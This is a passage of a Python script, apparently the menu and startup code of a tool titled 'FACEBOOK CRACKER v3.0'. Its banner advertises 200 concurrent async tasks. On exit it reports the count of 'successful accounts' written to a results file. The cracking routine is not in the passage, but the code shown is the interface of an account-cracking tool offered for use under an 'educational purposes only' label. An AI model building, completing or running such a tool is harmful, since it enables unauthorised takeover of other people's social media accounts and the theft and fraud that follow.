        print(f"\033[1;96m{'='*46}")
        print(f" \033[1;97mAsync HTTP Client: \033[1;92maiohttp")
        print(f" \033[1;97mConcurrent Tasks: \033[1;92m200")
        print(f" \033[1;97mConnection Limit: \033[1;92m200")
        print(f" \033[1;97mTimeout: \033[1;92m30 seconds")
        print(f" \033[1;91m[!] This tool is for educational purposes only!")
        linex()
        input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
    elif choice == '4':
        clear()
        print(f"\033[1;92m{'='*46}")
        print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
        print(f"\033[1;92m{'='*46}")
        print(f" \033[1;93m[!] Results saved in: SUMON_RANDOM_IDS.txt")
        print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
        time.sleep(3)
        break
    else:
        print(f" \033[1;91m[!] Invalid option! Please choose 1-4.")
        time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['aiohttp', 'asyncio']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Display banner
        clear()
        print(f"\033[1;96m{'='*46}")
        print(f"\033[1;96m     🚀 FACEBOOK CRACKER v3.0 🚀")
        print(f"\033[1;96m     ⚡ ASYNC MODE - 200 TASKS ⚡")
        print(f"\033[1;96m{'='*46}")
        print(f" \033[1;92mAuthor: BITHIKA")
        print(f" \033[1;92mVersion: 3.0 (Async)")
        print(f" \033[1;91mWarning: For educational purposes only!")
        print(f" \033[1;93mNote: Uses aiohttp for asynchronous requests")
        time.sleep(2)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error occurred: {str(e)}")
        sys.exit(1)
